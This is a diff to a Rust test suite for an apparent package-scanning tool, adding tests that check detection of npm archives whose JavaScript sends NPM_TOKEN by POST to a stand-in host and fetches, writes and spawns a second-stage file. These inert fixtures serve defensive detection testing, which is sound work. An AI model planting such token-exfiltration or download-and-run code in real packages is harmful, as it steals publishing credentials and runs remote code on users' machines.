@@ -8,7 +8,8 @@ use whoathere_detector::ArtifactFindingCategory;
 use whoathere_runner::{
     inspect_exact_artifact_v1, verify_static_download_execute_projections_v1,
     ExactArtifactFindingKindV1, ExactArtifactInspectionRequestV1, StaticProjectionRequestV1,
-    STATIC_PROJECTION_KIND_V1,
+    STATIC_PROJECTION_KIND_V1, STATIC_PROJECTION_METADATA_SCHEMA_V1,
+    STATIC_SENSITIVE_HTTPS_EXFILTRATION_PROJECTION_KIND_V1,
 };
 use zip::write::SimpleFileOptions;
 
@@ -34,6 +35,26 @@ const destination = '/tmp/inert-second-stage';
 https.get('https://example.invalid/second-stage');
 fs.writeFileSync(destination, Buffer.from('inert'));
 child_process.spawn(destination);
+"#;
+
+const JAVASCRIPT_SENSITIVE_HTTPS_EXFILTRATION: &[u8] = br#"const token = process.env.NPM_TOKEN;
+fetch('https://example.invalid/collect', {method: 'POST', body: token});
+"#;
+
+const JAVASCRIPT_COEXISTING_CAPABILITIES: &[u8] = br#"const fs = require('node:fs');
+const https = require('node:https');
+const child_process = require('node:child_process');
+const token = process.env.NPM_TOKEN;
+fetch('https://example.invalid/collect', {method: 'POST', body: token});
+const destination = '/tmp/inert-second-stage';
+https.get('https://example.invalid/second-stage');
+fs.writeFileSync(destination, Buffer.from('inert'));
+child_process.spawn(destination);
+"#;
+
+const JAVASCRIPT_UNRELATED_SENSITIVE_AND_HTTPS: &[u8] = br#"const token = process.env.NPM_TOKEN;
+console.log(token.length);
+fetch('https://example.invalid/status');
 "#;
 
 struct TempRoot(std::path::PathBuf);
@@ -336,6 +357,146 @@ fn exact_npm_and_pypi_archives_emit_only_citation_complete_static_projections() 
 }
 
 #[test]
+fn inert_npm_sensitive_https_flow_emits_only_citation_complete_static_projections() {
+    let bytes = npm_download_execute_tgz(JAVASCRIPT_SENSITIVE_HTTPS_EXFILTRATION);
+    let expected = Sha256Digest::from_bytes(&bytes);
+    let root = TempRoot::new("whoathere-static-sensitive-https-projection-npm");
+    let filename = "static-projection-npm-1.0.0.tgz";
+    let metadata = verify(&root, filename, &bytes, Ecosystem::Npm, &expected)
+        .expect("project inert sensitive-to-HTTPS capability");
+
+    assert_eq!(metadata.schema, STATIC_PROJECTION_METADATA_SCHEMA_V1);
+    assert_eq!(metadata.verification_status, "verified");
+    assert!(!metadata.admission_authority);
+    assert!(!metadata.observed_clean);
+    assert!(!metadata.projections.is_empty());
+    assert_eq!(metadata.projection_count, metadata.projections.len());
+    assert_eq!(
+        metadata.source_receipt_sha256,
+        metadata.verification_summary.deterministic_analysis_sha256
+    );
+    assert!(metadata.projections.iter().all(|projection| {
+        projection.kind == STATIC_SENSITIVE_HTTPS_EXFILTRATION_PROJECTION_KIND_V1
+            && projection.artifact_sha256 == expected
+            && projection.source_receipt_sha256 == metadata.source_receipt_sha256
+    }));
+
+    let canonical = metadata
+        .canonical_json_bytes()
+        .expect("serialize canonical sensitive-HTTPS metadata");
+    assert!(!canonical
+        .windows(b"https://example.invalid/collect".len())
+        .any(|window| window == b"https://example.invalid/collect"));
+    assert!(!canonical
+        .windows(b"NPM_TOKEN".len())
+        .any(|window| window == b"NPM_TOKEN"));
+    let parsed: serde_json::Value =
+        serde_json::from_slice(&canonical).expect("parse canonical sensitive-HTTPS metadata");
+    assert!(parsed["projections"]
+        .as_array()
+        .expect("projections array")
+        .iter()
+        .all(|projection| projection
+            .as_object()
+            .is_some_and(|projection| projection.len() == 10)));
+
+    let report = inspect_exact_artifact_v1(
+        ExactArtifactInspectionRequestV1 {
+            artifact_path: &root.path().join(filename),
+            quarantine_root: &root.path().join("product-report-quarantine"),
+            ecosystem: Some(Ecosystem::Npm),
+            acquired_at: "2026-07-17T00:00:00Z",
+            ai_requested: false,
+            ai_provider: None,
+            behavior_observation_requested: false,
+            detonation_requested: false,
+            normalization_limits: NormalizationLimits::default(),
+        },
+        None,
+        None,
+    )
+    .expect("build independent product report for sensitive-HTTPS identity cross-check");
+    let product_receipt = report
+        .stages
+        .iter()
+        .find(|stage| stage.stage == "deterministic_analysis")
+        .and_then(|stage| stage.result_sha256.as_deref())
+        .expect("product deterministic receipt");
+    assert_eq!(metadata.source_receipt_sha256.as_str(), product_receipt);
+    let product_observations = report
+        .observations
+        .iter()
+        .filter(|observation| {
+            observation.finding_kind
+                == ExactArtifactFindingKindV1::DeterministicStatic(
+                    ArtifactFindingCategory::HttpsSensitiveExfiltrationCapability,
+                )
+        })
+        .map(|observation| observation.observation_sha256.clone())
+        .collect::<Vec<_>>();
+    let projected_observations = metadata
+        .projections
+        .iter()
+        .map(|projection| projection.exact_observation_sha256.clone())
+        .collect::<Vec<_>>();
+    assert_eq!(projected_observations, product_observations);
+}
+
+#[test]
+fn one_projection_run_preserves_coexisting_capabilities() {
+    let bytes = npm_download_execute_tgz(JAVASCRIPT_COEXISTING_CAPABILITIES);
+    let expected = Sha256Digest::from_bytes(&bytes);
+    let root = TempRoot::new("whoathere-static-projection-coexisting-capabilities");
+    let filename = "static-projection-npm-1.0.0.tgz";
+
+    let metadata = verify(&root, filename, &bytes, Ecosystem::Npm, &expected)
+        .expect("project coexisting static capabilities");
+    let kinds = metadata
+        .projections
+        .iter()
+        .map(|projection| projection.kind)
+        .collect::<std::collections::BTreeSet<_>>();
+
+    assert_eq!(
+        kinds,
+        std::collections::BTreeSet::from([
+            STATIC_PROJECTION_KIND_V1,
+            STATIC_SENSITIVE_HTTPS_EXFILTRATION_PROJECTION_KIND_V1,
+        ])
+    );
+    assert!(metadata
+        .projections
+        .iter()
+        .all(|projection| projection.source_receipt_sha256 == metadata.source_receipt_sha256));
+}
+
+#[test]
+fn sensitive_https_projection_rejects_unrelated_source_and_network_calls() {
+    let bytes = npm_download_execute_tgz(JAVASCRIPT_UNRELATED_SENSITIVE_AND_HTTPS);
+    let expected = Sha256Digest::from_bytes(&bytes);
+    let root = TempRoot::new("whoathere-static-sensitive-https-no-flow");
+    let error = verify(
+        &root,
+        "static-projection-npm-1.0.0.tgz",
+        &bytes,
+        Ecosystem::Npm,
+        &expected,
+    )
+    .expect_err("unrelated source and HTTPS call must not project as exfiltration");
+
+    assert_eq!(
+        error.reason_code(),
+        "static_projection_download_execute_capability_not_found"
+    );
+    assert_eq!(error.exit_code(), 22);
+    let json: serde_json::Value =
+        serde_json::from_slice(&error.canonical_json_bytes()).expect("parse no-flow error JSON");
+    assert_eq!(json["schema"], STATIC_PROJECTION_METADATA_SCHEMA_V1);
+    assert_eq!(json["observed_clean"], false);
+    assert_eq!(json["admission_authority"], false);
+}
+
+#[test]
 fn changed_exact_archive_cannot_reuse_a_frozen_artifact_digest() {
     let original = wheel_download_execute_zip(PYTHON_DOWNLOAD_EXECUTE);
     let expected = Sha256Digest::from_bytes(&original);
@@ -390,6 +551,49 @@ fn bounded_no_match_is_inconclusive_and_never_clean() {
         serde_json::from_slice(&error.canonical_json_bytes()).expect("parse error JSON");
     assert_eq!(json["observed_clean"], false);
     assert_eq!(json["admission_authority"], false);
+}
+
+#[test]
+fn command_emits_both_supported_projection_kinds_in_one_run() {
+    let bytes = npm_download_execute_tgz(JAVASCRIPT_COEXISTING_CAPABILITIES);
+    let expected = Sha256Digest::from_bytes(&bytes);
+    let root = TempRoot::new("whoathere-static-projection-command-selection");
+    let artifact = root.path().join("static-projection-npm-1.0.0.tgz");
+    std::fs::write(&artifact, &bytes).expect("write inert command selection fixture");
+    let binary = env!("CARGO_BIN_EXE_whoathere-static-projection");
+
+    let output = Command::new(binary)
+        .args([
+            "--artifact",
+            artifact.to_str().expect("UTF-8 fixture path"),
+            "--ecosystem",
+            "npm",
+            "--acquired-at",
+            "2026-07-17T00:00:00Z",
+            "--expected-artifact-sha256",
+            expected.as_str(),
+        ])
+        .output()
+        .expect("run multi-kind projection command");
+
+    assert!(output.status.success());
+    assert!(output.stderr.is_empty());
+    let output_json: serde_json::Value =
+        serde_json::from_slice(&output.stdout).expect("parse multi-kind projection output");
+    assert_eq!(output_json["schema"], STATIC_PROJECTION_METADATA_SCHEMA_V1);
+    let kinds = output_json["projections"]
+        .as_array()
+        .expect("command projections")
+        .iter()
+        .map(|projection| projection["kind"].as_str().expect("projection kind"))
+        .collect::<std::collections::BTreeSet<_>>();
+    assert_eq!(
+        kinds,
+        std::collections::BTreeSet::from([
+            STATIC_PROJECTION_KIND_V1,
+            STATIC_SENSITIVE_HTTPS_EXFILTRATION_PROJECTION_KIND_V1,
+        ])
+    );
 }
 
 #[test]
